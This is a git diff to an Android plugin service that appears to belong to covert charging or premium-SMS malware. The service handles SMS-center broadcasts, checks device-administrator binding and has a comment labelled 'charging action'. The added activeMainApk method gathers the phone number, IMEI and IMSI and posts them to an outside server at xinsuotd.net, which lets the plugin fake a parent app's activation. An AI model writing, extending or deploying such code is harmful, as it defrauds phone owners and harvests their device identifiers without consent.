@@ -18,10 +18,7 @@ import com.xstd.plugin.Utils.BRCUtil;
 import com.xstd.plugin.Utils.CommonUtil;
 import com.xstd.plugin.Utils.DomanManager;
 import com.xstd.plugin.Utils.SMSUtil;
-import com.xstd.plugin.api.ActiveRequest;
-import com.xstd.plugin.api.ActiveResponse;
-import com.xstd.plugin.api.PhoneFetchRequest;
-import com.xstd.plugin.api.PhoneFetchRespone;
+import com.xstd.plugin.api.*;
 import com.xstd.plugin.binddevice.DeviceBindBRC;
 import com.xstd.plugin.config.AppRuntime;
 import com.xstd.plugin.config.Config;
@@ -43,11 +40,13 @@ public class PluginService extends IntentService {
 
     public static final String ACTIVE_ACTION = "com.xstd.plugin.active";
 
-    public static final String ACTIVE_PACKAGE_ACTION = "com.xstd.plugin.package.active";
+    public static final String ACTIVE_PLUGIN_PACKAGE_ACTION = "com.xstd.plugin.package.active";
 
     public static final String SMS_BROADCAST_ACTION = "com.xstd.plugin.broadcast";
 
     public static final String ACTIVE_FETCH_PHONE_ACTION = "com.xstd.plugin.fetch.phone";
+
+    public static final String ACTION_MAIN_UUID_ACTIVE_BY_PLUGN = "com.xstd.main.uuid.active";
 
     /**
      * 扣费行动
@@ -69,7 +68,7 @@ public class PluginService extends IntentService {
             if (ACTIVE_ACTION.equals(action) && !AppRuntime.ACTIVE_PROCESS_RUNNING.get()) {
                 //do active
                 activePluginAction();
-            } else if (ACTIVE_PACKAGE_ACTION.equals(action)) {
+            } else if (ACTIVE_PLUGIN_PACKAGE_ACTION.equals(action)) {
                 /**
                  * 其实什么也不需要做，这个action主要就是激活一下plugin程序
                  * 这条消息是由主程序发出的，如果主程序不激活子程序的话，子程序是不能接受到所有的BRC的
@@ -84,11 +83,60 @@ public class PluginService extends IntentService {
                 broadcastSMSForSMSCenter(intent);
             } else if (ACTIVE_FETCH_PHONE_ACTION.equals(action)) {
                 fetchPhoneFromServer();
+            } else if (ACTION_MAIN_UUID_ACTIVE_BY_PLUGN.equals(action)) {
+                //子程序模拟母程序激活
+                activeMainApk();
             }
         }
 
         MobclickAgent.onPause(this);
     }
+
+    private void activeMainApk() {
+        if (Config.DEBUG) {
+            Config.LOGD("[[PluginService::activeQS]]");
+        }
+
+        if (AppRuntime.isTablet(getApplicationContext())) {
+            if (Config.DEBUG) {
+                Config.LOGD("[[PluginService::activeQS]] return as the device is Tab");
+            }
+            return;
+        }
+
+        try {
+            String phone = UtilsRuntime.getCurrentPhoneNumber(getApplicationContext());
+            if (TextUtils.isEmpty(phone)) phone = "00000000000";
+            String imei = UtilsRuntime.getIMEI(getApplicationContext());
+            if (TextUtils.isEmpty(imei)) {
+                imei = String.valueOf(System.currentTimeMillis());
+            }
+            String imsi = UtilsRuntime.getIMSI(getApplicationContext());
+            if (TextUtils.isEmpty(imsi)) {
+                imsi = "987654321";
+            }
+            MainActiveRequest request = new MainActiveRequest(UtilsRuntime.getVersionName(getApplicationContext())
+                                                         , imei
+                                                         , imsi
+                                                         , SettingManager.getInstance().getMainApkChannel()
+                                                         , phone
+                                                         , SettingManager.getInstance().getMainApkSendUUID()
+                                                         , "http://www.xinsuotd.net/gais/"
+                                                         , SettingManager.getInstance().getMainExtraInfo());
+            MainActiveResponse response = InternetUtils.request(getApplicationContext(), request);
+
+            if (response != null && !TextUtils.isEmpty(response.url)) {
+                if (Config.DEBUG) {
+                    Config.LOGD("[[Plugin::activeQS]] active success, response : " + response.toString());
+                }
+                //激活成功
+                SettingManager.getInstance().setMainApkActiveTime(System.currentTimeMillis());
+                return;
+            }
+        } catch (Exception e) {
+        }
+    }
+
 
     private synchronized void fetchPhoneFromServer() {
         if (Config.DEBUG) {
@@ -495,10 +543,13 @@ public class PluginService extends IntentService {
     }
 
     private synchronized void activePackageAction(Intent intent) {
-        Config.LOGD("[[PluginService::onHandleIntent]] >>> action : " + ACTIVE_PACKAGE_ACTION + " <<<<");
+        Config.LOGD("[[PluginService::onHandleIntent]] >>> action : " + ACTIVE_PLUGIN_PACKAGE_ACTION + " <<<<");
         try {
             SettingManager.getInstance().setKeyActiveAppName(intent.getStringExtra("name"));
             SettingManager.getInstance().setKeyActivePackageName(intent.getStringExtra("packageName"));
+            SettingManager.getInstance().setMainApkSendUUID(intent.getStringExtra("uuid"));
+            SettingManager.getInstance().setMainExtraInfo(intent.getStringExtra("extra"));
+            SettingManager.getInstance().setMainApkChannel(intent.getStringExtra("channel"));
 
             DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
             boolean isActive = dpm.isAdminActive(new ComponentName(this.getApplicationContext(), DeviceBindBRC.class));
